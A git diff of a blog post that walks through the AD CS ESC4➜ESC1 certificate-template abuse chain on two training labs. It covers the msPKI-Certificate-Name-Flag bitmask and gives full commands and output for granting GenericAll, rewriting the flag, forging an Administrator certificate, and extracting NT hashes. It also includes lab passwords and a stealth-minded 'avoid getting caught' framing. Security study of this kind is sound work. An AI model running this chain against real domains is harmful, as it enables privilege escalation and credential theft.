@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Read the Bits, Not the Integer: msPKI-Certificate-Name-Flag and the ESC4 ➜ ESC1 Chain"
+title: "Read the Bits, Not the Integer: msPKI-Certificate-Name-Flag and the ESC4➜ESC1 Chain"
 categories: [ADCS]
 tags: [msPKI-Certificate-Name-Flag, adcs, esc1, esc4, certifried, cve-2022-26923, ms-crtd, ms-wcce]
 wide: true
@@ -21,6 +21,10 @@ tag_anchors:
 The `msPKI-Certificate-Name-Flag` attribute is frequently explained using an oversimplified, inaccurate sequential bitmask in Active Directory Certificate Services (AD CS) write-ups. If you are relying on community cheat sheets to identify [ESC1](#the-two-mode-framework--what-makes-a-template-abusable) or [ESC4](#the-two-mode-framework--what-makes-a-template-abusable) vulnerabilities, you might be missing critical attack paths due to a fundamental misunderstanding of how this attribute is structured.
 
 This post uses the official Microsoft protocol specifications as the source of truth to decode the exact values, expose the common "5-row table" fallacy, and provide a definitive reference for offensive operators and detection engineers. The second half is a full end-to-end run of the ESC4 ➜ ESC1 chain on the live HackTheBox machine [PingPong](https://app.hackthebox.com/machines/PingPong) — every command, every output, every failure.
+
+### TL;DR
+
+`msPKI-Certificate-Name-Flag` is a bitmask — not a boolean. And yes: in a lab, `bloodyAD set object ... -v 1` gives you the same forged cert. Everyone who says "just 0➜1, what's the use" is right — until the baseline has bits you can't afford to lose. On PingPong the baseline is `0xa2000000`: three require-bits encoding UPN, email, and directory-path requirements. A dirty write of `1` wipes all three — the template stops building identities from AD, someone's smartcard auth changes shape, and the blue team gets a ticket. The correct move is an OR: read the existing value, compute `existing | 1`, write back the combined result. `0xa2000000 ➜ 0xa2000001` is a one-bit delta and a clean exploit. `0xa2000000 ➜ 0x00000001` is a demolition. In a CTF lab, none of this matters. **In a real engagement, it's the difference between a clean op and getting caught because someone's smartcard stopped working.** Read the baseline. OR into it.
 
 > **Context — what this post is.** The attack-class background for *why* a writable certificate template is [ESC4](https://posts.specterops.io/certified-pre-owned-d959034265de) (SpecterOps' *Certified Pre-Owned* by Will Schroeder and Lee Christensen, 2021), and the case study of one require-bit being abused in production — [CVE-2022-26923 / Certifried](https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained) — are linked from the relevant sections below. This post focuses on the bitmask itself — the *value* of each bit, the *behaviour* it triggers on the CA — and then weaponises it live.
 
@@ -253,7 +257,7 @@ Same write, same ESC1 capability, original require bits intact. The principle: *
 
 ### The Box and the Seat
 
-PingPong is a two-forest box. `PING.HTB` hosts the PKI — the CA `ping-DC1-CA` on `dc1.ping.htb`, and every template in its Configuration partition. `PONG.HTB` is a trusted partner forest where the foothold lives: `r.martinelli`, authenticated with an AES key. BloodHound's foreign security principal edges are what pointed at the path — the `r.martinelli` seat in `PONG.HTB` resolves to write rights on the `SmartcardAuthentication` template object in `PING.HTB`'s Configuration partition. **One forest writes, the other forest enrolls.** That split is the whole story of the box, and it dictates every tool choice below. The addresses:
+PingPong is a two-forest box. `PING.HTB` hosts the PKI — the CA `ping-DC1-CA` on `dc1.ping.htb`, and every template in its Configuration partition. `PONG.HTB` is a trusted partner forest where the foothold lives: `r.martinelli`, authenticated with an AES key (redacted in the commands — the box is still active on HTB). BloodHound's foreign security principal edges are what pointed at the path — the `r.martinelli` seat in `PONG.HTB` resolves to write rights on the `SmartcardAuthentication` template object in `PING.HTB`'s Configuration partition. **One forest writes, the other forest enrolls.** That split is the whole story of the box, and it dictates every tool choice below. The addresses:
 
 ```zsh
 # /etc/hosts — DC1's VPN-facing IP rotates per spawn; DC2 is stable:
@@ -268,12 +272,13 @@ PingPong is a two-forest box. `PING.HTB` hosts the PKI — the CA `ping-DC1-CA` 
 ```zsh
 # Generate a TGT
 ➜ getTGT.py 'pong.htb/r.martinelli' \
-    -aesKey 61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98 \
+    -aesKey [REDACTED] \
     -dc-ip $target_dc02_ip
 
 # Cross-Realm LDAP Ticket
 ➜ env KRB5CCNAME='r.martinelli.ccache' \
 kvno ldap/dc1.ping.htb
+
 ldap/dc1.ping.htb@PING.HTB: kvno = 7
 ```
 
@@ -332,15 +337,7 @@ certipy find -k -no-pass \
     -target dc2.pong.htb -dc-ip $target_dc02_ip \
     -stdout -vulnerable
 
-[*] Finding certificate templates
-[*] Found 0 certificate templates
-[*] Finding certificate authorities
-[*] Found 0 certificate authorities
-[*] Found 0 enabled certificate templates
-[*] Finding issuance policies
-[*] Found 1 issuance policy
-[*] Found 0 OIDs linked to templates
-[*] Enumeration output:
+# ...same enumeration as attempt one...
 Certificate Authorities                 : [!] Could not find any CAs
 Certificate Templates                   : [!] Could not find any certificate templates
 ```
@@ -615,6 +612,7 @@ Certipy's vulnerability list depends on who runs it. With write granted to a spe
 ➜ bloodyAD -d ping.htb --host dc1.ping.htb -u r.martinelli -k ccache=r.martinelli.ccache \
     add genericAll 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
     'c.roberts'
+
 [+] c.roberts has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
 
 ➜ env KRB5CCNAME=c.roberts.ccache \
@@ -656,10 +654,11 @@ For the real run the grant goes to `S-1-5-11` — Authenticated Users — instea
     -u r.martinelli -k ccache=r.martinelli.ccache \
     add genericAll 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
     'S-1-5-11'
+
 [+] S-1-5-11 has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
 ```
 
-`S-1-5-11` is Authenticated Users — every authenticated principal in PING can now enroll. GenericAll is the sledgehammer version of this ACE; a targeted Enroll grant to one controlled principal is the quieter one. Good enough for a CTF box that resets every week — a live domain would want the quieter version.
+`S-1-5-11` is Authenticated Users — every authenticated principal in PING can now enroll. GenericAll is the sledgehammer version of this ACE; a targeted Enroll grant to one controlled principal is the quieter one.
 
 ### The Two-Principal Relay
 
@@ -667,9 +666,6 @@ The enrollment has to come from a PING principal, not the PONG foothold. `certip
 
 ```zsh
 ➜ getTGT.py 'PING.HTB/c.roberts:AssumedBreach123'
-Impacket v0.14.0.dev0+20260902.145455.d310e07c - Copyright Fortra, LLC and its affiliated companies
-
-[*] Saving ticket in c.roberts.ccache
 ```
 
 Two principals, one exploit: PONG writes the template, PING enrolls from it.
@@ -686,7 +682,6 @@ certipy req -k -no-pass \
     -template SmartcardAuthentication \
     -upn 'Administrator@ping.htb' \
     -sid 'S-1-5-21-750635624-2058721901-1932338391-500'
-Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
 [*] Request ID is 19
@@ -707,7 +702,6 @@ Request ID 19. The CA signed a certificate for a user it believes is Administrat
     -username Administrator \
     -domain ping.htb \
     -dc-ip $target_dc01_ip
-Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
 [*]     SAN UPN: 'Administrator@ping.htb'
@@ -719,10 +713,10 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Saving credential cache to 'administrator.ccache'
 [*] Wrote credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff
+[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:[REDACTED]
 ```
 
-PKINIT accepts the cert because the template carries the Client Authentication EKU. TGT granted, NT hash extracted — `63905deb12b527aadfdbc26d3f423eff`. Note the SAN: only `Administrator@ping.htb`, no second UPN. The preserved require-bits didn't inject the requester's identity into the forged cert; the CA took the CSR as-is.
+PKINIT accepts the cert because the template carries the Client Authentication EKU. TGT granted, NT hash extracted (redacted — the box is still active on HTB). Note the SAN: only `Administrator@ping.htb`, no second UPN. The preserved require-bits didn't inject the requester's identity into the forged cert; the CA took the CSR as-is.
 
 ```zsh
 ➜ env KRB5CCNAME='administrator.ccache' \
@@ -749,6 +743,7 @@ changetype: modify
 replace: msPKI-Certificate-Name-Flag
 msPKI-Certificate-Name-Flag: 2717908992
 EOF
+
 SASL/GSSAPI authentication started
 SASL username: r.martinelli@PONG.HTB
 SASL SSF: 256
@@ -805,11 +800,8 @@ certipy template -k -no-pass \
     -dc-ip $target_dc01_ip \
     -template SmartcardAuthentication \
     -write-default-configuration
-Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [-] Kerberos error: Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use) (Error code: 68)
-[-] Got error: Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
-[-] Use -debug to print a stacktrace
 ```
 
 `KDC_ERR_WRONG_REALM` — error code 68. Certipy is built on Impacket, and Impacket's Kerberos implementation struggles natively with cross-realm TGS referrals. When certipy asks for a service ticket to `ldap/dc1.ping.htb` using the PONG ticket, it gets confused about which realm's KDC is authoritative, and throws. The `ldapmodify -Y GSSAPI` write that did the real work goes through the system's native `libkrb5` instead — the same C library every production MIT-Kerberos client uses — which resolves the referral transparently, hopping from the PONG KDC to the PING KDC and back with the service ticket.
@@ -838,16 +830,6 @@ distinguishedName: CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public
 msPKI-Certificate-Name-Flag: 0
 ```
 
-```zsh
-## Alt — raw ldapsearch over LDAPS:
-➜ LDAPTLS_REQCERT=never ldapsearch -LLL -x -H ldaps://10.0.10.5 \
-    -D 'a.owen@westbridge.hsm' -w 'SecretMyth123!' \
-    -b 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
-    msPKI-Certificate-Name-Flag
-
-msPKI-Certificate-Name-Flag: 0
-```
-
 `0` — a blank bitmask. No supply bits, no require bits; the template shipped empty. That's what makes the quick-and-dirty write below harmless here: there were no guardrails to wipe. The same one-liner on PingPong's `0xa2000000` baseline would have flattened three. Same command, different baselines, different damage. And since this is a flat lab — no cross-realm hop to make, no signing wall to hit — the whole chain below runs through certipy alone. The wrapper works here because its assumptions hold here.
 
 ```zsh
@@ -859,9 +841,7 @@ msPKI-Certificate-Name-Flag: 0
 ...[snip]...
     [!] Vulnerabilities
       ESC4                              : User has dangerous permissions.
-```
 
-```zsh
 # Write the ESC1-enabling flag:
 ➜ certipy template \
     -target dc.westbridge.hsm -dc-ip 10.0.10.5 \
@@ -870,22 +850,17 @@ msPKI-Certificate-Name-Flag: 0
 
 ...[snip]...
 [*] Successfully updated 'SmartCardAuthentication'
-```
 
-```zsh
 # Re-check after the write:
-➜ certipy template \
-    -target dc.westbridge.hsm -dc-ip 10.0.10.5 \
-    -u a.owen@westbridge.hsm -p 'SecretMyth123!' \
+➜ certipy find \
+    -u 'a.owen@westbridge.hsm' -p 'SecretMyth123!' -dc-ip 10.0.10.5 \
     -vulnerable -stdout
 
 ...[snip]...
     [!] Vulnerabilities
       ESC1                              : Enrollee supplies subject and template allows client authentication.
       ESC4                              : User has dangerous permissions.
-```
 
-```zsh
 # Enroll:
 ➜ certipy req \
     -target dc.westbridge.hsm -dc-ip 10.0.10.5 \
@@ -897,9 +872,7 @@ msPKI-Certificate-Name-Flag: 0
 
 ...[snip]...
 [*] Wrote certificate and private key to 'administrator.pfx'
-```
 
-```zsh
 # PKINIT:
 ➜ certipy auth \
     -pfx administrator.pfx -dc-ip 10.0.10.5
@@ -908,7 +881,7 @@ msPKI-Certificate-Name-Flag: 0
 [*] Got hash for 'administrator@westbridge.hsm': aad3b435b51404eeaad3b435b51404ee:23f398d3fa12625a1dab8a2c19cdd96b
 ```
 
-Same chain, four commands, no cross-realm Kerberos, no FSPs, no enhanced LDAP signing. None of the failure modes that broke the PingPong certipy calls apply. **It's a real distinction, not a stylistic preference** — the tool's failure mode is *predictable from the topology* of the target, not the skill of the operator. (The Westbridge writeup is still cooking — once it's out, [the full run](https://secretmyth.blog/hacksmarter/hsm-westbridge-university-range/) will live there, including what `-write-default-configuration` leaves behind in the bitmask.)
+Same chain, five commands, no cross-realm Kerberos, no FSPs, no enhanced LDAP signing. None of the failure modes that broke the PingPong certipy calls apply. **It's a real distinction, not a stylistic preference** — the tool's failure mode is *predictable from the topology* of the target, not the skill of the operator. (The Westbridge writeup is still cooking — once it's out, [the full run](https://secretmyth.blog/hacksmarter/hsm-westbridge-university-range/) will live there.)
 
 ## Closing — Read The Bits, Not The Integer
 
